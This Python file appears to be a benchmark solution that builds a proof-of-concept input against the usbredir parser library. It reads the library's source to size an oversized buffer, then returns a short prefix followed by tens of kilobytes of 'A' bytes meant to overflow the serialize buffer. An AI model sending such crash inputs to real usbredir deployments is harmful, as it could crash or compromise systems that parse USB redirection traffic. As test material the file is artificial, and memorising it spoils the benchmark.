import os
import re
import tarfile
from typing import Iterable, Optional, Tuple


class Solution:
    def _iter_source_texts(self, src_path: str) -> Iterable[Tuple[str, str]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not fn.lower().endswith((".c", ".h", ".cc", ".cpp", ".hpp", ".inc", ".inl", ".m", ".mm")):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    yield (p, data.decode("utf-8", errors="ignore"))
            return

        if not tarfile.is_tarfile(src_path):
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if not name.lower().endswith((".c", ".h", ".cc", ".cpp", ".hpp", ".inc", ".inl", ".m", ".mm")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    yield (name, data.decode("utf-8", errors="ignore"))
        except Exception:
            return

    def _safe_eval_int_expr(self, expr: str) -> Optional[int]:
        expr = expr.strip()
        expr = expr.split("/*", 1)[0].split("//", 1)[0].strip()
        if not expr:
            return None
        expr = expr.replace("UL", "").replace("ULL", "").replace("L", "")
        expr = re.sub(r"\s+", " ", expr).strip()

        if not re.fullmatch(r"[0-9a-fA-FxX\s\(\)\+\-\*/%<>&\|\^~]+", expr):
            return None
        try:
            val = eval(expr, {"__builtins__": None}, {})
        except Exception:
            return None
        if not isinstance(val, int):
            return None
        if val < 0:
            return None
        return val

    def _find_macro_int(self, texts: Iterable[Tuple[str, str]], macro: str) -> Optional[int]:
        pat = re.compile(r"^[ \t]*#[ \t]*define[ \t]+" + re.escape(macro) + r"[ \t]+(.+?)\s*$", re.M)
        for _, t in texts:
            m = pat.search(t)
            if not m:
                continue
            v = self._safe_eval_int_expr(m.group(1))
            if v is not None:
                return v
        return None

    def _detect_harness_style(self, texts: Iterable[Tuple[str, str]]) -> str:
        best = "unknown"
        for _, t in texts:
            if "LLVMFuzzerTestOneInput" not in t and "main(" not in t:
                continue
            if "usbredirparser_do_write" in t:
                return "do_write"
            if "usbredirparser_unserialize" in t:
                best = "unserialize"
            if "usbredirparser_do_read" in t and best == "unknown":
                best = "do_read"
        return best

    def solve(self, src_path: str) -> bytes:
        texts = list(self._iter_source_texts(src_path))
        buf_sz = self._find_macro_int(texts, "USBREDIRPARSER_SERIALIZE_BUF_SIZE")
        if buf_sz is None or buf_sz < 4096:
            buf_sz = 64 * 1024

        _ = self._detect_harness_style(texts)

        data_len = max(buf_sz + 4096, 0x1FFFF)

        prefix = b"\xFF\xFF\x01\x00"
        payload = b"A" * data_len
        return prefix + payload